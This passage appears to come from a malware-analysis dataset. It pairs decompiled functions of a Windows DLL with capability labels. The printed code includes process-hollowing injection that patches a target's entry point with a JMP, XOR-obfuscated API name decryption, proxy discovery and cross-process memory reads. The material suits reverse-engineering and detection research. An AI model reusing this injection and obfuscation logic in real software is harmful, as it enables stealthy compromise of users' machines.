{\n                    for (; 0x8 < piStack936; piStack936 = piStack936 - piVar5[1]) {\n                        uStack964 = piVar15[1] - 8U >> 1;\n                        iVar10 = *piVar15;\n                        piVar5 = piVar15;\n                        if ((piVar15[1] <= piStack936) && (uStack964 != 0)) {\n                            piVar15 = piVar15 + 2;\n                            uVar9 = uStack964;\n                            do {\n                                uVar2 = *piVar15;\n                                if (uVar2 >> 0xc == 3) {\n                                    *(puStack984 + (uVar2 & 0xfff) + iVar10) =\n                                         *(puStack984 + (uVar2 & 0xfff) + iVar10) + piStack988;\n                                }\n                                else if (uVar2 >> 0xc == 10) {\n                                    uVar8 = uVar2 & 0xfff;\n                                    puVar1 = puStack984 + uVar8 + iVar10;\n                                    uVar3 = *puVar1;\n                                    *puVar1 = *puVar1 + piStack928;\n                                    *(puStack984 + uVar8 + 4 + iVar10) =\n                                         *(puStack984 + uVar8 + 4 + iVar10) + iStack932 + CARRY4(uVar3, piStack928);\n                                }\n                                piVar15 = piVar15 + 2;\n                                uVar9 = uVar9 - 1;\n                                piVar5 = uStack980;\n                            } while (uVar9 != 0);\n                        }\n                        piVar15 = piVar5 + piVar5[1];\n                        piVar11 = piVar14;\n                        uStack980 = piVar15;\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_SetLastError)(0);\n                fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > LoadSystemExe : Generate JMP opcode\", 0x3bb);\n                iVar7 = piVar11[10] + uStack964;\n                fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > LoadSystemExe : ThreadContext.Eax : %p\", 0x3c1);\n                fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > LoadSystemExe : pNtHeaders->OptionalHeader.AddressOfEntryPoint : %p\"\n                             , 0x3c4);\n                fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > LoadSystemExe : ABS AddressOfEntryPoint : %p\", 0x3c7);\n                iVar10 = (*_sym.imp.KERNEL32.dll_ReadProcessMemory)(uStack960, iStack684 + 8, &stack0xfffffc60, 4, 0);\n                if (iVar10 == 0) {\n                    uVar6 = 0x3cf;\n                    lpString = \"GTK DLL: inject_image.cpp:%d > LoadSystemExe : unable read Image Base of %ws\";\n                }\n                else {\n                    fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > LoadSystemExe : ImageBase : 0x%08x\", 0x3d3);\n                    pcVar4 = _sym.imp.KERNEL32.dll_IsBadReadPtr;\n                    iStack940 = 1;\n                    iVar10 = (*_sym.imp.KERNEL32.dll_IsBadReadPtr)(&stack0xfffffc34, 1);\n                    if (iVar10 == 0) {\n                        uStack980._0_1_ = 0xe9;\n                    }\n                    uStack980 = uStack980 & 0xffffff00 | uStack980;\n                    iVar10 = (*pcVar4)(&stack0xfffffc2d, 4);\n                    if (iVar10 == 0) {\n                        uVar9 = (iVar7 - iStack668) - 5;\n                        piStack988 = piStack988 & 0xff | uVar9 * 0x100;\n                        puStack984 = puStack984 & 0xffffff00 | uVar9 >> 0x18;\n                    }\n                    puVar16 = &stack0xfffffc24;\n                    uVar6 = extraout_ECX;\n                    fcn.0040964b(puVar16);\n                    fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > LoadSystemExe : Resuming thread\", 0x3eb);\n                    (*_sym.imp.KERNEL32.dll_ResumeThread)(iStack976, puVar16, uVar6);\n                    (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    uVar6 = 0x3ed;\n                    lpString = \"GTK DLL: inject_image.cpp:%d > LoadSystemExe : 2 ResumeThread() passed, error = %d\";\n                }\n                goto code_r0x00409bef;\n            }\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > LoadSystemExe : Unable to map the section into the target process, error %u\"\n                         , 0x36d);\n        }\n        else {\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > LoadSystemExe : Unable to allocate a section of %d bytes, error %u\"\n                         , 0x365);\n            iVar10 = iStack976;\n        }\n    }\n    if (puStack984 != NULL) {\n        uVar6 = (*_sym.imp.ntdll.dll_NtUnmapViewOfSection)(0xffffffff, puStack984);\n        (*_sym.imp.ntdll.dll_RtlNtStatusToDosError)(uVar6);\n    }\ncode_r0x00409c13:\n    pcVar4 = _sym.imp.KERNEL32.dll_CloseHandle;\n    if (iVar10 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar10);\n    }\n    if (iStack940 == 0) {\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar17, 0);\n        (*pcVar4)(uStack964);\n        (*pcVar4)(uStack964);\n    }\n    return uVar17;\n}\n",
        "token_count": 3684
    },
    "0040a83f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040a83f(uint param_1, uchar *param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint uVar9;\n    uint *puVar10;\n    bool bVar11;\n    uint pszFile;\n    int32_t pProxyConfig;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uchar *psz1;\n    uint32_t pAutoProxyOptions;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t lpcwszUrl;\n    uint pProxyInfo;\n    int32_t psz2;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    puVar10 = &pProxyConfig;\n    for (iVar5 = 4; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    pszFile._0_2_ = 0;\n    psz1 = param_2;\n    sub.ntdll.dll_memset(&pszFile + 2, 0, 0x206);\n    var_4h = 0;\n    puVar10 = &pszFile;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *param_2 = 0;\n        param_2 = param_2 + 1;\n    }\n    fcn.00403bde(\"GTK DLL: proxydetect.cpp:%d > GetProxyForUrl : Get proxy for [%ws]\", 0x50);\n    iVar5 = (*_sym.imp.WINHTTP.dll_WinHttpGetIEProxyConfigForCurrentUser)(&pProxyConfig);\n    if ((iVar5 == 0) || (iVar5 = fcn.0040a7e2(),  iVar5 == 0)) {\ncode_r0x0040ac11:\n        uVar9 = 0;\n    }\n    else {\n        fcn.00403bde(\"GTK DLL: proxydetect.cpp:%d > GetProxyForUrl : Get proxy for wszHostName [%ws]\", 0x54);\n        fcn.00403bde(\"GTK DLL: proxydetect.cpp:%d > GetProxyForUrl : ieProxyConfig [%ws]\", 0x55);\n        uVar9 = 1;\n        if (((pProxyConfig == 0) && (var_3ch == 0)) ||\n           (iVar5 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(0, 1, 0, 0, 0),  iVar5 == 0)) {\ncode_r0x0040a9e2:\n            if (var_38h == 0) {\n                fcn.00403bde(\"GTK DLL: proxydetect.cpp:%d > GetProxyForUrl : WinHttpGetIEProxyConfigForCurrentUser return NULL\"\n                             , 0x7f);\n                goto code_r0x0040ac11;\n            }\n            if (var_34h == 0) {\n                fcn.00403bde(\"GTK DLL: proxydetect.cpp:%d > GetProxyForUrl : ieProxyConfig.lpszProxyBypass : NULL, skip test\"\n                             , 0x95);\n            }\n            else {\n                fcn.00403bde(\"GTK DLL: proxydetect.cpp:%d > GetProxyForUrl : ieProxyConfig.lpszProxyBypass : %ws\", 0x85)\n                ;\n                iVar5 = fcn.00403a41(&var_4h);\n                while (iVar5 != 0) {\n                    fcn.00403bde(\"GTK DLL: proxydetect.cpp:%d > GetProxyForUrl : Test bypass : %ws\", 0x8b);\n                    iVar5 = (*_sym.imp.SHLWAPI.dll_PathMatchSpecW)(&pszFile, iVar5);\n                    if (iVar5 != 0) goto code_r0x0040ac11;\n                    iVar5 = fcn.00403a41(&var_4h);\n                }\n            }\n            iVar5 = (*_sym.imp.ntdll.dll_wcschr)(var_38h, 0x3d);\n            if (iVar5 == 0) {\n                fcn.00403bde(\"GTK DLL: proxydetect.cpp:%d > GetProxyForUrl : ieProxyConfig.lpszProxy : [%ws]\", 0x99);\n                (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, var_38h);\n                goto code_r0x0040ac13;\n            }\n            var_24h = 0x3341510a;\n            var_20h._0_2_ = 0x5910;\n            var_20h._2_1_ = 6;\n            stack0xffffffdf = 0x9352262;\n            var_1ch._3_1_ = 100;\n            var_18h._0_2_ = 0x7659;\n            psz2 = 0x33355162;\n            var_8h = var_8h & 0xff000000 | 0x765964;\n            fcn.00401000(0x1c);\n            iVar5 = var_4h;\n            iVar6 = 0;\n            var_4h = 7;\n            do {\n                puVar1 = iVar6 + iVar5;\n                iVar7 = iVar6 % 7;\n                iVar6 = iVar6 + 1;\n                *puVar1 = *(&psz2 + iVar7) ^ puVar1[&var_24h - iVar5];\n            } while (iVar6 < 0xe);\n            fcn.00403bde(\"GTK DLL: proxydetect.cpp:%d > GetProxyForUrl : decrypt (wide char) %s -> %ws\", 0x9e);\n            var_20h._0_2_ = 0x7926;\n            stack0xffffffdf = 0x3453454c;\n            var_1ch._3_1_ = 0x61;\n            var_18h._0_2_ = 0x793d;\n            var_18h._2_1_ = 0x73;\n            var_18h._3_1_ = 0x4c;\n            var_20h._2_1_ = 7;\n            psz2 = 0x4c73794e;\n            var_8h = 0x61445331;\n            fcn.00401000(0x18);\n            iVar6 = var_4h;\n            uVar8 = 0;\n            do {\n                puVar1 = uVar8 + var_4h;\n                uVar4 = uVar8 & 0x80000007;\n                if (uVar4 < 0) {\n                    uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n                }\n                uVar8 = uVar8 + 1;\n                *puVar1 = *(&psz2 + uVar4) ^ puVar1[&var_20h - var_4h];\n            } while (uVar8 < 0xc);\n            fcn.00403bde(\"GTK DLL: proxydetect.cpp:%d > GetProxyForUrl : decrypt (wide char) %s -> %ws\", 0x9f);\n            iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, iVar5);\n            var_8h = iVar7 == lpcwszUrl;\n            var_4h = 0;\n            uVar8 = var_8h;\n            do {\n                lpcwszUrl = fcn.00403a41(&var_4h);\n                pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (lpcwszUrl == 0) {\n                    uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar9);\n                    uVar9 = (*pcVar3)(0, iVar5);\n                    (*pcVar2)(uVar9);\n                    goto code_r0x0040ac11;\n                }\n                iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, iVar6);\n            } while ((uVar8 != (iVar7 == lpcwszUrl)) ||\n                    (iVar7 = (*_sym.imp.ntdll.dll_wcschr)(lpcwszUrl, 0x3d),  uVar8 = var_8h,  iVar7 == 0));\n            fcn.00403bde(\"GTK DLL: proxydetect.cpp:%d > GetProxyForUrl : ProxyHost : %ws\", 0xa9);\n            (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, iVar7 + 2);\n            pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n            pcVar3 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar9);\n            uVar9 = (*pcVar2)(0, iVar5);\n            (*pcVar3)(uVar9);\n        }\n        else {\n            bVar11 = pProxyConfig != 0;\n            var_24h = 0;\n            var_20h._0_2_ = 0;\n            var_20h._2_1_ = 0;\n            stack0xffffffdf = 0;\n            var_1ch._3_1_ = 0;\n            var_28h = bVar11;\n            pAutoProxyOptions = bVar11;\n            if (var_3ch != 0) {\n                pAutoProxyOptions = bVar11 | 2;\n                var_24h = var_3ch;\n            }\n            var_18h._0_2_ = 1;\n            var_18h._2_1_ = 0;\n            var_18h._3_1_ = 0;\n            puVar10 = &pProxyInfo;\n            for (iVar6 = 4; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            iVar6 = (*_sym.imp.WINHTTP.dll_WinHttpGetProxyForUrl)(iVar5, lpcwszUrl, &pAutoProxyOptions, &pProxyInfo);\n            if ((iVar6 == 0) || (psz2 == 0)) {\n                (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar5);\n                pcVar3 = _sym.imp.KERNEL32.dll_GlobalFree;\n                if (psz2 != 0) {\n                    (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n                }\n                if (var_8h != 0) {\n                    (*pcVar3)(var_8h);\n                }\n                goto code_r0x0040a9e2;\n            }\n            fcn.00403bde(\"GTK DLL: proxydetect.cpp:%d > GetProxyForUrl : WinHttpGetProxyForUrl return [%ws]\", 0x73);\n            (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, psz2);\n            (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar5);\n            pcVar3 = _sym.imp.KERNEL32.dll_GlobalFree;\n            if (psz2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n            }\n            if (var_8h != 0) {\n                (*pcVar3)(var_8h);\n            }\n        }\n        uVar9 = 1;\n    }\ncode_r0x0040ac13:\n    pcVar3 = _sym.imp.KERNEL32.dll_GlobalFree;\n    if (var_3ch != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(var_3ch);\n    }\n    if (var_38h != 0) {\n        (*pcVar3)(var_38h);\n    }\n    if (var_34h != 0) {\n        (*pcVar3)(var_34h);\n    }\n    return uVar9;\n}\n",
        "token_count": 2849
    },
    "0040adb1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040adb1(int32_t param_1)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_18h = param_1;\n    if (*0x427db8 == NULL) {\n        var_30h = 0x3c3b3233;\n        var_2ch = 0x2a735723;\n        var_28h = 0x31300333;\n        var_24h._0_2_ = 0x3412;\n        var_24h._2_1_ = 0x7a;\n        var_14h = 0x536c417a;\n        var_10h._0_2_ = 0x6154;\n        var_10h._2_1_ = 0x47;\n        fcn.00401000(0xf);\n        iVar7 = 0;\n        var_8h = 7;\n        do {\n            puVar1 = iVar7 + var_ch;\n            iVar5 = iVar7 % 7;\n            iVar7 = iVar7 + 1;\n            *puVar1 = *(&var_14h + iVar5) ^ puVar1[&var_30h - var_ch];\n        } while (iVar7 < 0xf);\n        fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupIsWow64Process : decrypt (char) %s -> %s\", 0xbe);\n        var_30h = 0x2d21162d;\n        var_2ch = 0x744b050a;\n        var_28h = 0x32f375d;\n        var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x69);\n        var_20h = 0x43537346;\n        var_1ch._0_2_ = 0x696f;\n        var_1ch._2_1_ = 0x78;\n        fcn.00401000(0xd);\n        iVar7 = var_14h;\n        iVar5 = 0;\n        do {\n            puVar1 = iVar5 + var_14h;\n            iVar6 = iVar5 % var_8h;\n            iVar5 = iVar5 + 1;\n            *puVar1 = *(&var_20h + iVar6) ^ puVar1[&var_30h - var_14h];\n        } while (iVar5 < 0xd);\n        fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupIsWow64Process : decrypt (char) %s -> %s\", 0xbf);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar7, var_ch);\n        *0x427db8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n        pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        uVar4 = (*pcVar3)(0, var_ch);\n        (*pcVar2)(uVar4);\n        if (*0x427db8 == NULL) {\n            return var_4h;\n        }\n    }\n    if ((var_18h != 0) && (iVar7 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, var_18h),  iVar7 != 0)) {\n        iVar5 = (**0x427db8)(iVar7, &var_4h);\n        var_4h = var_4h & -(iVar5 != 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar7);\n    }\n    return var_4h;\n}\n",
        "token_count": 1011
    },
    "0040b372": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040b372(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    uint *in_EDX;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t lpModuleName;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    _var_28h = 0;\n    var_18h = in_EDX;\n    var_4h = in_ECX;\n    if (in_ECX == -1) {\n        var_ch = 1;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        var_4h = fcn.0040b314();\n    }\n    if (*0x427de0 == NULL) {\n        var_34h = 0x2853015c;\n        var_30h = 0x250b1e29;\n        var_2ch._0_2_ = 0x755e;\n        var_20h = 0x44377532;\n        var_1ch = 0x496f3045;\n        fcn.00401000(10);\n        uVar6 = 0;\n        do {\n            puVar1 = uVar6 + lpModuleName;\n            uVar4 = uVar6 & 0x80000007;\n            if (uVar4 < 0) {\n                uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n            }\n            uVar6 = uVar6 + 1;\n            *puVar1 = *(&var_20h + uVar4) ^ puVar1[&var_34h - lpModuleName];\n        } while (uVar6 < 10);\n        fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupReadProcess64Memory : decrypt (char) %s -> %s\", 0x237);\n        var_50h = 0x91a312d;\n        var_4ch = 0x25777b43;\n        var_48h = 0x62022c23;\n        var_44h = 0x33033124;\n        var_40h = 0x28790a2c;\n        var_3ch = 0x3434182e;\n        var_38h._0_2_ = 0x50;\n        var_38h._2_1_ = 0x4d;\n        var_20h = 0x664d4677;\n        var_1ch = var_1ch & 0xff000000 | 0x434d34;\n        fcn.00401000(0x1b);\n        iVar9 = var_10h;\n        var_14h = &var_50h - var_10h;\n        iVar8 = 0;\n        do {\n            var_10h = 7;\n            puVar1 = iVar8 + iVar9;\n            iVar7 = iVar8 % 7;\n            iVar8 = iVar8 + 1;\n            *puVar1 = *(&var_20h + iVar7) ^ puVar1[var_14h];\n        } while (iVar8 < 0x1b);\n        fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupReadProcess64Memory : decrypt (char) %s -> %s\", 0x238);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar9);\n        *0x427de0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar5);\n        pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        uVar5 = (*pcVar3)(0, lpModuleName);\n        (*pcVar2)(uVar5);\n        var_28h = 0;\n        iVar9 = var_4h;\n        in_EDX = var_18h;\n        if (*0x427de0 == NULL) goto code_r0x0040b51e;\n    }\n    iVar9 = var_4h;\n    var_28h = 0;\n    iVar8 = (**0x427de0)(var_4h, *in_EDX, in_EDX[1], arg_8h, arg_ch, 0, &var_28h);\n    if (-1 < iVar8) {\n    }\ncode_r0x0040b51e:\n    if (var_ch != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar9);\n    }\n    return var_28h;\n}\n",
        "token_count": 1242
    },
    "0040b534": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040b534(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint8_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uchar *puVar5;\n    int16_t iVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    int32_t iVar9;\n    int32_t *in_EDX;\n    uint32_t uVar10;\n    int32_t iVar11;\n    code *pcVar12;\n    int32_t iVar13;\n    int32_t *piVar14;\n    uchar *puVar15;\n    uint var_a8h;\n    uint var_a0h;\n    uint var_9ch;\n    int32_t var_74h;\n    uint32_t var_70h;\n    int32_t *var_6ch;\n    uint32_t var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    uint32_t var_4ch;\n    uint var_48h;\n    ushort var_44h;\n    uint var_42h;\n    uchar *var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_60h = 0;\n    var_5ch = 0;\n    var_4ch = 0;\n    var_48h._0_1_ = 0x5c;\n    var_48h._1_1_ = 1;\n    var_48h._2_2_ = 0x2853;\n    var_44h = 0x1e29;\n    var_42h._0_2_ = 0x250b;\n    var_42h._2_2_ = 0x755e;\n    var_8h = 0x44377532;\n    var_4h = 0x496f3045;\n    var_6ch = in_EDX;\n    fcn.00401000(10);\n    uVar10 = 0;\n    do {\n        puVar1 = uVar10 + var_58h;\n        uVar7 = uVar10 & 0x80000007;\n        if (uVar7 < 0) {\n            uVar7 = (uVar7 - 1 | 0xfffffff8) + 1;\n        }\n        uVar10 = uVar10 + 1;\n        *puVar1 = *(&var_8h + uVar7) ^ puVar1[&var_48h - var_58h];\n    } while (uVar10 < 10);\n    fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupWow64QueyProcessModules64 : decrypt (char) %s -> %s\", 0x270);\n    var_2ch = 0x5f1c300d;\n    var_28h = 0x67a5c1a;\n    var_24h = 0x14422e32;\n    var_20h = 0x28312023;\n    var_1ch = 0x1e0c5d39;\n    var_18h = 0x1b293827;\n    var_14h = 0x2b090242;\n    var_10h = 0x47d3424;\n    var_ch._0_1_ = 0x6d;\n    var_8h = 0x304b4757;\n    var_4h = var_4h & 0xff000000 | 0x4e6a6d;\n    fcn.00401000(0x21);\n    iVar9 = var_64h;\n    iVar13 = 0;\n    var_34h = 0x7;\n    do {\n        puVar1 = iVar13 + var_64h;\n        iVar11 = iVar13 % 7;\n        iVar13 = iVar13 + 1;\n        *puVar1 = *(&var_8h + iVar11) ^ puVar1[&var_2ch - var_64h];\n    } while (iVar13 < 0x21);\n    fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupWow64QueyProcessModules64 : decrypt (char) %s -> %s\", 0x271);\n    iVar13 = var_58h;\n    pcVar12 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n    if ((*0x428214 & 1) == 0) {\n        *0x428214 = *0x428214 | 1;\n        *0x428218 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_58h);\n    }\n    if ((*0x428214 & 2) == 0) {\n        *0x428214 = *0x428214 | 2;\n        *0x42821c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x428218, iVar9);\n    }\n    if (*0x428218 == 0) {\n        *0x428218 = (*pcVar12)(iVar13);\n    }\n    pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x42821c == NULL) {\n        var_2ch = 0x5f1c300d;\n        var_28h = 0x67a5c1a;\n        var_24h = 0x14422e32;\n        var_20h = 0x28312023;\n        var_1ch = 0x1e0c5d39;\n        var_18h = 0x1b293827;\n        var_14h = 0x2b090242;\n        var_10h = 0x47d3424;\n        var_ch._0_1_ = 0x6d;\n        var_8h = 0x304b4757;\n        var_4h = var_4h & 0xff000000 | 0x4e6a6d;\n        fcn.00401000(0x21);\n        iVar9 = var_30h;\n        iVar13 = 0;\n        var_30h = &var_2ch - var_30h;\n        do {\n            puVar1 = iVar13 + iVar9;\n            iVar11 = iVar13 % var_34h;\n            iVar13 = iVar13 + 1;\n            *puVar1 = *(&var_8h + iVar11) ^ puVar1[var_30h];\n        } while (iVar13 < 0x21);\n        fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupWow64QueyProcessModules64 : decrypt (char) %s -> %s\", 0x27c);\n        *0x42821c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x428218, iVar9);\n        uVar8 = (*pcVar12)(0, iVar9);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n        iVar13 = var_58h;\n        iVar9 = var_64h;\n    }\n    fcn.0040adb1();\n    if ((*0x42821c != NULL) && (iVar11 = (**0x42821c)(var_50h, 0, &var_a8h, 0x30, &var_54h),  -1 < iVar11)) {\n        uVar8 = (*pcVar12)(0, 0x200);\n        var_34h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n        if (var_34h != NULL) {\n            uVar8 = (*pcVar12)(0, 0x100);\n            iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n            if ((iVar11 != 0) && (var_54h = fcn.0040b372(iVar11, 0x28),  var_54h != 0)) {\n                fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupWow64QueyProcessModules64 : BasicInfo.PebBaseAddress : 0x%16x\"\n                             , 0x29b);\n                var_54h = fcn.0040b372(iVar11 + 0x28, 0x40);\n                if (var_54h != 0) {\n                    var_30h = *(iVar11 + 0x18) + 0x10;\n                    var_44h = *(iVar11 + 0x3c);\n                    var_42h._0_2_ = *(iVar11 + 0x3c) >> 0x10;\n                    var_4ch = 4;\n                    var_4h = *(iVar11 + 0x1c) + (0xffffffef < *(iVar11 + 0x18));\n                    piVar14 = var_6ch + 2;\n                    iVar3 = *(iVar11 + 0x38);\n                    var_48h._0_1_ = iVar3;\n                    var_48h._1_1_ = iVar3 >> 8;\n                    var_48h._2_2_ = iVar3 >> 0x10;\n                    if ((iVar3 != var_30h) || (*(iVar11 + 0x3c) != var_4h)) {\n                        do {\n                            var_54h = fcn.0040b372(iVar11 + 0x68, 0x98);\n                            iVar13 = var_58h;\n                            iVar9 = var_64h;\n                            if (var_54h == 0) break;\n                            fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupWow64QueyProcessModules64 : &ProcInfo->LdrEntry : %p\"\n                                         , 0x2b2);\n                            puVar5 = var_34h;\n                            var_74h = *(iVar11 + 0x68);\n                            var_70h = *(iVar11 + 0x6c);\n                            var_48h._0_1_ = var_74h;\n                            var_48h._1_1_ = var_74h >> 8;\n                            var_48h._2_2_ = var_74h >> 0x10;\n                            var_4ch = var_4ch + 0x120;\n                            var_44h = var_70h;\n                            var_42h._0_2_ = var_70h >> 0x10;\n                            if (var_4ch <= arg_8h) {\n                                uVar2 = *(iVar11 + 0xb0);\n                                *(piVar14 + 6) = var_5ch;\n                                piVar14[5] = *(iVar11 + 0xd0);\n                                *(piVar14 + 7) = *(iVar11 + 0xd4);\n                                piVar14[4] = *(iVar11 + 0xa8);\n                                piVar14[2] = *(iVar11 + 0x98);\n                                var_68h = uVar2 >> 1;\n                                piVar14[3] = *(iVar11 + 0x9c);\n                                puVar15 = var_34h;\n                                for (iVar9 = 0x200; iVar9 != 0; iVar9 = iVar9 + -1) {\n                                    *puVar15 = 0;\n                                    puVar15 = puVar15 + 1;\n                                }\n                                if ((var_68h < 0x100) &&\n                                   (var_54h = fcn.0040b372(var_34h, *(iVar11 + 0xb0)),  var_54h != 0)) {\n                                    